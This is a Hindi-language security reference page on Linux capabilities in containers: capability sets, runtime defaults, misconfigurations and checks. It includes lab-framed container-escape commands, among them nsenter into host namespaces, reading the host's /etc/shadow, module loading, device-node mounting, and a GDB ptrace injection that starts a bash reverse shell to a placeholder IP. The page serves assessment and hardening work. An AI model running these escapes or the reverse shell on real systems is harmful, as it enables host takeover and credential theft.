# Containers में Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

Linux capabilities, container security के सबसे महत्वपूर्ण हिस्सों में से एक हैं, क्योंकि वे एक सूक्ष्म लेकिन बुनियादी सवाल का जवाब देती हैं: **container के अंदर "root" होने का असल में क्या मतलब है?** सामान्य Linux system पर, ऐतिहासिक रूप से UID 0 का मतलब विशेषाधिकारों का एक बहुत व्यापक सेट होता था। आधुनिक kernels में, इन विशेषाधिकारों को capabilities नाम की छोटी इकाइयों में बाँट दिया गया है। कोई process root के रूप में चल सकता है, फिर भी उसमें कई शक्तिशाली operations करने की क्षमता नहीं हो सकती, अगर संबंधित capabilities हटा दी गई हों। <sup>[[1]](#references)</sup>

Containers इस अंतर पर बहुत अधिक निर्भर करते हैं। Compatibility या simplicity के कारण कई workloads अब भी container के अंदर UID 0 के रूप में launch किए जाते हैं। Capabilities हटाए बिना, यह बहुत खतरनाक होगा। Capabilities हटाने पर, containerized root process container के अंदर कई सामान्य काम कर सकता है, लेकिन उसे अधिक संवेदनशील kernel operations से रोका जा सकता है। इसीलिए container shell में `uid=0(root)` दिखने का अपने-आप में यह मतलब नहीं है कि वह "host root" है या उसके पास व्यापक kernel privileges हैं। Capability sets तय करते हैं कि उस root identity का असल में कितना महत्व है।

Linux capabilities के पूरे reference और दुरुपयोग के कई उदाहरणों के लिए, देखें:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## कार्यप्रणाली

Capabilities को कई sets में track किया जाता है, जिनमें permitted, effective, inheritable, ambient और bounding sets शामिल हैं। कई container assessments में, इन sets के kernel semantics का सटीक विवरण उस व्यावहारिक सवाल जितना तुरंत महत्वपूर्ण नहीं होता: **यह process अभी कौन-से privileged operations सफलतापूर्वक कर सकता है, और भविष्य में privilege हासिल करने की कौन-सी संभावनाएँ अब भी मौजूद हैं?** <sup>[[1]](#references)</sup>

यह इसलिए मायने रखता है, क्योंकि कई breakout techniques असल में capability से जुड़ी समस्याएँ होती हैं, जो container की समस्याओं के रूप में छिपी होती हैं। `CAP_SYS_ADMIN` वाले workload को kernel की बहुत सारी ऐसी कार्यक्षमताएँ मिल सकती हैं, जिन्हें सामान्य container root process को इस्तेमाल नहीं करना चाहिए। `CAP_NET_ADMIN` वाला workload और भी खतरनाक हो जाता है, अगर वह host network namespace भी share करता हो। `CAP_SYS_PTRACE` वाला workload तब अधिक दिलचस्प हो जाता है, जब host PID sharing के ज़रिए उसे host processes दिख सकते हों। Docker या Podman में यह `--pid=host` के रूप में दिख सकता है; Kubernetes में यह आम तौर पर `hostPID: true` के रूप में दिखता है।

दूसरे शब्दों में, capability set का मूल्यांकन अलग-थलग करके नहीं किया जा सकता। इसे namespaces, seccomp और MAC policy के साथ मिलाकर देखना होगा।

## Lab

Container के अंदर capabilities की जाँच करने का एक सीधा तरीका है:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

आप अधिक प्रतिबंधात्मक container की तुलना उस container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

सीमित रूप से जोड़ने का प्रभाव देखने के लिए, सब कुछ हटाकर केवल एक capability वापस जोड़ने का प्रयास करें:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

ये छोटे प्रयोग दिखाते हैं कि कोई runtime केवल "privileged" नाम का boolean toggle नहीं करता। वह process के लिए उपलब्ध वास्तविक privilege surface को आकार देता है।

## उच्च-जोखिम वाली Capabilities

Capabilities तभी escape primitives बनती हैं, जब उनका operation **होस्ट-नियंत्रित संसाधन** तक पहुँचता है। बार-बार दिखने वाले उच्च-जोखिम वाले संयोजन ये हैं:

- **`CAP_SYS_ADMIN`** के साथ host PID, block device या writable kernel-control path। किसी target mount namespace में शामिल होने के लिए `CAP_SYS_CHROOT` भी आवश्यक है; block-based filesystem mount करने के लिए initial user namespace में `CAP_SYS_ADMIN` चाहिए।
- **`CAP_SYS_PTRACE`** के साथ host PID visibility और ऐसा host process जिस पर attach किया जा सके। ptrace injection के लिए `CAP_SYS_ADMIN` आवश्यक नहीं है।
- **`CAP_DAC_OVERRIDE` या `CAP_DAC_READ_SEARCH`** के साथ पहुँच योग्य host filesystem। ये capabilities अलग-अलग DAC checks को bypass करती हैं, लेकिन host filesystem view उपलब्ध नहीं करातीं।
- Initial user namespace में **`CAP_SYS_MODULE`** के साथ स्वीकार्य, kernel-compatible module। सामान्य Linux containers node kernel साझा करते हैं; VM या userspace-kernel runtimes इस सीमा को बदल देते हैं।
- Initial user namespace में **`CAP_MKNOD`** के साथ ऐसा वास्तविक host device जिसकी अनुमति device cgroup पहले से देता हो। Node बनाने से device cgroup bypass नहीं होता।
- **`CAP_SYS_RAWIO`** के साथ exposed और usable memory, I/O-port, PCI या device-control interface।
- Host reboot के लिए initial PID namespace में **`CAP_SYS_BOOT`**, या kernel replacement के लिए usable और permitted kexec path।
- सीधे node network-state को नियंत्रित करने के लिए host network namespace में **`CAP_NET_ADMIN`**। **`CAP_NET_RAW`** किसी protocol-specific escape में भूमिका निभा सकता है, लेकिन केवल raw sockets से node shell नहीं मिलता।

**`CAP_SYS_CHROOT`** को जानबूझकर standalone escape capability के रूप में सूचीबद्ध नहीं किया गया है। Mount-namespace `setns()` के लिए इसकी आवश्यकता हो सकती है और यह पहले से पहुँच योग्य host tree का उपयोग आसान बना सकता है, लेकिन केवल `chroot()` न तो उस tree को उपलब्ध कराता है, न ही filesystem की नई permissions देता है। इसी तरह, **`CAP_BPF`** और **`CAP_PERFMON`** शक्तिशाली telemetry और kernel attack surface उपलब्ध कराते हैं, लेकिन किसी अलग kernel flaw के बिना इनके सामान्य operations generic container escapes नहीं हैं।

## Runtime में उपयोग

Docker, Podman, containerd-आधारित stacks और CRI-O—सभी capability controls का उपयोग करते हैं, लेकिन इनके defaults और management interfaces अलग-अलग हैं। Docker इन्हें `--cap-drop` और `--cap-add` जैसे flags के ज़रिए सीधे उपलब्ध कराता है। Podman भी ऐसे ही controls देता है और अक्सर इन्हें अतिरिक्त सुरक्षा परत के रूप में rootless execution के साथ इस्तेमाल करता है। Kubernetes, Pod या container के `securityContext` के ज़रिए capability additions और drops उपलब्ध कराता है; निचले स्तर के runtimes परिणामी sets को OCI runtime configuration में व्यक्त करते हैं। LXC और Incus जैसे system-container environments भी capability control पर निर्भर करते हैं, लेकिन उनका व्यापक host integration operators को defaults ढीले करने के लिए प्रेरित कर सकता है—ऐसा वे application container के लिए शायद न करें। <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

इन सभी में एक ही सिद्धांत लागू होता है: किसी capability को तकनीकी रूप से grant किया जा सकता है, इसका अर्थ यह नहीं कि उसे grant करना चाहिए। वास्तविक दुनिया की कई घटनाएँ तब शुरू होती हैं, जब operator केवल इसलिए कोई capability जोड़ देता है क्योंकि workload सख्त configuration में विफल हो गया था और टीम को तुरंत समाधान चाहिए था।

## गलत कॉन्फ़िगरेशन

सबसे स्पष्ट गलती Docker/Podman-शैली के CLIs में **`--cap-add=ALL`** का उपयोग करना है, लेकिन यही एकमात्र गलती नहीं है। व्यवहार में, अधिक आम समस्या यह है कि "application को चलाने के लिए" एक या दो बेहद शक्तिशाली capabilities—विशेषकर `CAP_SYS_ADMIN`—दे दी जाती हैं, जबकि namespace, seccomp और mount के प्रभावों को समझा नहीं जाता। एक और आम समस्या अतिरिक्त capabilities को host namespace sharing के साथ जोड़ना है। Docker या Podman में यह `--pid=host`, `--network=host` या `--userns=host` के रूप में दिख सकता है; Kubernetes में आम तौर पर इसके समकक्ष exposure, `hostPID: true` या `hostNetwork: true` जैसी workload settings से आता है। इनमें से हर संयोजन बदल देता है कि capability वास्तव में किन चीज़ों को प्रभावित कर सकती है।

यह भी आम है कि administrators मान लेते हैं: workload पूरी तरह `--privileged` नहीं है, इसलिए उस पर अब भी सार्थक सीमाएँ हैं। कभी-कभी यह सही होता है, लेकिन कभी-कभी प्रभावी स्थिति privileged से इतनी मिलती-जुलती होती है कि व्यावहारिक रूप से यह अंतर मायने नहीं रखता।

## दुरुपयोग

प्रभावी sets, user-namespace mapping, seccomp state, namespaces, mounts और devices को दर्ज करके शुरुआत करें। इस संदर्भ के बिना, केवल capability का नाम किसी escape का प्रमाण नहीं है:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespaces और block devices

Host PID visibility के साथ, `CAP_SYS_ADMIN` से host namespaces में प्रवेश किया जा सकता है। Mount-namespace operation के लिए caller के user namespace में `CAP_SYS_CHROOT` भी आवश्यक है।

**Capability और confinement की जाँच करें:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**लक्ष्य की सूची बनाएं:** कंटेनर/Pod कॉन्फ़िगरेशन या स्पष्ट host process list से host PID sharing की पुष्टि करें, फिर लक्ष्य namespaces का निरीक्षण करें। निजी PID namespaces में भी स्थानीय PID 1 मौजूद होता है, इसलिए केवल इसकी मौजूदगी host PID sharing साबित नहीं करती।

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**namespace path को Exploit करें:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Capability checks उन user namespaces में सफल होने चाहिए जो targets के मालिक हैं। `--pid=host` या Kubernetes `hostPID: true` visibility देते हैं; वे capabilities नहीं देते।

वैकल्पिक block-device path के लिए, candidates को **enumerate** करें, फिर validated candidate को पहले read-only mount करके accessible filesystem को **exploit** करें:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

device node मौजूद होना चाहिए, device cgroup को इसकी अनुमति देनी चाहिए, और block-filesystem mounts के लिए initial user namespace में `CAP_SYS_ADMIN` आवश्यक है। पहले से `/host` पर bind-mounted host root, `CAP_SYS_ADMIN` के बिना भी host access देता है। `chroot /host` केवल सुविधा के लिए है और इसके लिए अलग से `CAP_SYS_CHROOT` आवश्यक है।

### पहुँच योग्य host root: सीधे filesystem से execution

अगर host root पहले से `/host` पर mounted है, तो पहले mount की पुष्टि करें और फिर मौजूदा access का सीधे उपयोग करें। यह तरीका `CAP_SYS_ADMIN` पर निर्भर नहीं करता:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

यदि `chroot()` उपलब्ध न हो, लेकिन host binary container के architecture और loader के साथ compatible हो, तो अक्सर इसे mounted tree के ज़रिए call किया जा सकता है:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

`/host` के तहत सीधे read और write करना पहले से ही host-filesystem compromise है। `chroot()` या host binary को execute करने से बस यह access अधिक सुविधाजनक हो जाता है; इनमें से कोई भी operation host mount नहीं बनाता या read-only mount अथवा MAC policy को bypass नहीं करता।

### `CAP_SYS_PTRACE`: host-process injection

Host PID visibility और target के user namespace में `CAP_SYS_PTRACE` होने पर, GDB किसी approved host process से `system()` call करवा सकता है। `CAP_SYS_ADMIN` की आवश्यकता नहीं है।

**Capability और attachment controls जाँचें:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**एक disposable target की सूची बनाकर चयन करें:** configuration या स्पष्ट node process list से host PID sharing की पुष्टि करें; कभी भी PID 1 या किसी critical daemon को न चुनें।

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**चयनित process को Exploit करें:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

लक्ष्य को attach किया जा सकना चाहिए और उसमें उपयोग योग्य `system()` symbol तथा Bash payload path होना चाहिए। Yama, non-dumpable state, seccomp, user namespaces और MAC policy इस chain को रोक सकते हैं। GDB attach होने पर लक्ष्य को रोक देता है, इसलिए केवल disposable lab process का उपयोग करें।

### `CAP_DAC_OVERRIDE` और `CAP_DAC_READ_SEARCH`: सुरक्षित host files

ये capabilities host filesystem को expose नहीं करतीं। यदि `/host` पहले से host mount है, तो `CAP_DAC_READ_SEARCH` read/search DAC checks को bypass कर सकता है और `CAP_DAC_OVERRIDE` सामान्य write checks को भी bypass कर सकता है:

**Capabilities जाँचें:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**एक्सपोज़्ड होस्ट फ़ाइल सिस्टम की सूची बनाएँ और लक्ष्य अनुमतियाँ निर्धारित करें:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**अस्थायी लैब में read और write bypasses का अभ्यास करें**:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

रीड-ओनली mount और LSM के नियम अब भी लागू होते हैं। `CAP_DAC_READ_SEARCH` `open_by_handle_at()` की अनुमति भी देता है, लेकिन Shocker जैसे breakout के लिए उसी अंतर्निहित filesystem का mount file descriptor, मान्य या खोजे जा सकने वाले handles, संगत filesystem/storage layout, और runtime या LSM की ओर से कोई रोक न होना भी ज़रूरी है। इससे mount namespace के बाहर मौजूद हर filesystem तक मनमानी पहुँच नहीं मिलती।

### `CAP_SYS_MODULE`: साझा-kernel में execution

सामान्य Linux container में, स्वीकृत module साझा host kernel में चलता है।

**Capability और user-namespace scope जाँचें:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**मॉड्यूल लोड करने की पूर्वापेक्षाएँ सूचीबद्ध करें:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**केवल संगत, पहले से समीक्षा किए गए proof module के साथ disposable node पर exploit करें:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

Capability प्रारंभिक user namespace में effective होना चाहिए। Kernel version और configuration, module signatures, lockdown, seccomp और LSM policy को load की अनुमति देनी चाहिए। Kata, gVisor, Hyper-V isolation और इसी तरह के runtimes यह बदलते हैं कि workload किस kernel boundary तक पहुँचता है।

### `CAP_MKNOD`: एक अनुमत device handle बनाएँ

`CAP_MKNOD` एक device node बनाता है, लेकिन device cgroup को bypass नहीं करता। Device creation namespaced नहीं है, इसलिए capability प्रारंभिक user namespace में effective होनी चाहिए।

**Capability और user-namespace scope जाँचें:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**वास्तविक डिवाइस, उनके major/minor नंबर, और कोई भी दिखाई देने वाली cgroup-v1 allowlist सूचीबद्ध करें:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**validated ext-family candidate को read-only रूप में Exploit करें:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

अन्य filesystems के लिए matching read-only tool की ज़रूरत होती है; device को mount करने के लिए `CAP_SYS_ADMIN` भी चाहिए। बनाया गया node खोलते समय `Operation not permitted` मिलने का आम तौर पर मतलब है कि device cgroup अब भी उस access को block कर रहा है। cgroup v2 में, device access आम तौर पर BPF से enforce किया जाता है और `devices.list` file मौजूद नहीं होती, इसलिए सफलतापूर्वक open कर पाना निर्णायक test है।

### `CAP_SYS_RAWIO`: exposed raw-I/O interface

कोई portable generic payload नहीं है: valid addresses और effects hardware तथा kernel configuration पर निर्भर करते हैं।

**Capability और user-namespace scope जाँचें:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**उजागर हुए रॉ इंटरफ़ेस, हार्डवेयर और ड्राइवरों की सूची बनाएँ:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**केवल पहचाने गए डिवाइस और एड्रेस रेंज के लिए स्वीकृत प्रूफ के साथ ही exploit करें।** यदि `/dev/mem` लैब द्वारा स्वीकृत इंटरफ़ेस है, तो यह टेम्पलेट उसकी सामग्री प्रिंट किए बिना node-memory disclosure को साबित करता है:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

पता lab के hardware map से ही लेना चाहिए, क्योंकि कुछ MMIO regions को पढ़ने से side effects हो सकते हैं। सामान्य memory-write command भ्रामक और असुरक्षित होगा: एक ही पता एक मशीन पर हानिरहित हो सकता है, जबकि दूसरी मशीन पर hardware या kernel memory को नियंत्रित कर सकता है। Device cgroups, filesystem permissions, सख्त `/dev/mem`, kernel lockdown, virtualization और LSM policy आम तौर पर उपयोगी access को रोकते हैं।

### `CAP_SYS_BOOT`: namespace reboot या kernel replacement

एक private PID namespace में, `reboot()` host को reboot करने के बजाय उस namespace की init process को समाप्त करता है। इसलिए host reboot करने के लिए initial PID namespace की आवश्यकता होती है, जो आम तौर पर host PID sharing के ज़रिए उपलब्ध होता है। kexec path के लिए एक compatible kernel image और permissive lockdown/signature policy भी आवश्यक है:

**Capability जांचें:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**PID-namespace और kexec की prerequisites सूचीबद्ध करें: workload configuration से host PID sharing की पुष्टि करें, क्योंकि केवल PID namespace link से यह पता नहीं चलता कि वह node का initial namespace है या नहीं।**

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**केवल तभी exploit करें जब किसी अस्थायी लैब नोड को रीबूट करना स्पष्ट रूप से अभ्यास का हिस्सा हो:**

```bash
sync
reboot -f
```

उस क्षमता को साबित करने के लिए किसी साझा node पर वह command न चलाएँ और न ही kernel load करें। Private PID namespace में, इससे केवल उस namespace की init process समाप्त होती है और host पर प्रभाव साबित नहीं होता।

### `CAP_NET_ADMIN` और `CAP_NET_RAW`: host network paths

`CAP_NET_ADMIN` केवल मौजूदा network namespace को प्रभावित करता है।

**capabilities और confinement की जाँच करें:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**मौजूदा नेटवर्कों की सूची बनाएं और workload configuration से host networking की पुष्टि करें:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**`CAP_NET_ADMIN` का इस्तेमाल बदलाव वापस लेने योग्य तरीके से करें:** host networking के साथ, अस्थायी interface एक node interface होता है।

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` RAW और PACKET sockets की अनुमति देता है, लेकिन यह सामान्य host shell नहीं है। दस्तावेज़ीकृत GCE chain को **enumerate** करने के लिए, metadata route जाँचें और capture करें कि plaintext guest-agent traffic दिखाई देता है या नहीं:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

यदि matching prerequisites मौजूद हैं, तो [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) में बताए गए environment-specific chain का **exploit** करें: request और sequence state capture करें, SSH key वाला forged metadata response inject करें, फिर host access validate करें। इस chain के लिए root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic और raceable guest-agent request आवश्यक थे; आधुनिक transport या agent behavior इसे विफल कर सकता है।

### Local-origin प्रतिबंध और interface addresses

कोई listener `127.0.0.1` से आने वाले connections को अस्वीकार कर सकता है, लेकिन उसी network namespace को सौंपे गए किसी दूसरे address को नज़रअंदाज़ कर सकता है। यदि listener उस interface से reachable है, तो loopback connection की तुलना किसी मौजूदा non-loopback local address से bound connection के साथ करें। `CAP_NET_ADMIN` मौजूदा namespace में interface configuration की अनुमति दे सकता है, लेकिन यदि उपयुक्त address पहले से assigned है, तो इसकी आवश्यकता नहीं है। सामान्य TCP connection के लिए `CAP_NET_RAW` आवश्यक नहीं है। यह source-address classification की विफलता है, container escape नहीं और न ही इस बात का प्रमाण कि application किसी privileged request को authorize करेगी।<sup>[[1]](#references)[[7]](#references)</sup>

WebSocket listener के लिए, वैध HTTP `101 Switching Protocols` response यह स्थापित करता है कि opening handshake पूरी हो गई; इसके बाद आने वाली application-level error दिखा सकती है कि connection handler तक पहुँचा। इनमें से कोई भी response यह साबित नहीं करता कि authentication या अनुरोधित operation सफल हुआ।<sup>[[8]](#references)</sup>

## Checks

Capability checks का उद्देश्य केवल raw values dump करना नहीं है, बल्कि यह समझना भी है कि क्या process के पास अपने मौजूदा namespace और mount स्थिति को खतरनाक बनाने के लिए पर्याप्त privilege है।

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

यहाँ क्या दिलचस्प है:

- `capsh --print` से `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` या `cap_sys_module` जैसी उच्च-जोखिम वाली capabilities को पहचानना सबसे आसान है।
- `/proc/self/status` में `CapEff` लाइन बताती है कि अभी वास्तव में कौन-सी capabilities प्रभावी हैं, न कि केवल वे जो दूसरे sets में उपलब्ध हो सकती हैं।
- यदि container में host PID, network या user namespaces भी साझा किए गए हों, या host mounts writable हों, तो capabilities का dump कहीं अधिक महत्वपूर्ण हो जाता है।

कच्ची capability जानकारी इकट्ठा करने के बाद अगला कदम उसका विश्लेषण करना है। पता करें कि क्या process root है, क्या user namespaces सक्रिय हैं, क्या host namespaces साझा किए गए हैं, क्या seccomp लागू है, और क्या AppArmor या SELinux अब भी process को प्रतिबंधित करते हैं। केवल capability set से पूरी तस्वीर नहीं मिलती, लेकिन अक्सर यही बताता है कि एक container breakout क्यों काम करता है, जबकि शुरुआत में स्थिति समान दिखने पर भी दूसरा विफल हो जाता है।

## Runtime Defaults

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | आम तौर पर मैन्युअल रूप से कमजोर करने के तरीके |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से कम capability set | Docker capabilities की डिफ़ॉल्ट allowlist रखता है और बाकी को हटा देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | डिफ़ॉल्ट रूप से कम capability set | Podman containers डिफ़ॉल्ट रूप से unprivileged होते हैं और कम capabilities वाला model इस्तेमाल करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | बदलाव न होने पर runtime defaults विरासत में मिलते हैं | अगर `securityContext.capabilities` निर्दिष्ट न हों, तो container को runtime से default capability set मिलता है | `securityContext.capabilities.add`, `drop: [\"ALL\"]` न करना, `privileged: true` |
| containerd / CRI-O under Kubernetes | आम तौर पर runtime default | प्रभावी set runtime और Pod spec, दोनों पर निर्भर करता है | Kubernetes वाली पंक्ति के समान; सीधे OCI/CRI configuration में भी capabilities स्पष्ट रूप से जोड़ी जा सकती हैं |

Kubernetes के लिए अहम बात यह है कि API कोई एक सार्वभौमिक default capability set तय नहीं करता। अगर Pod capabilities न जोड़े या हटाए, तो workload को उस node का runtime default विरासत में मिलता है।

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege और Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - container के लिए capabilities सेट करना](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` और `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - सुरक्षा](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Linux IPv4 protocol implementation](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455.html)
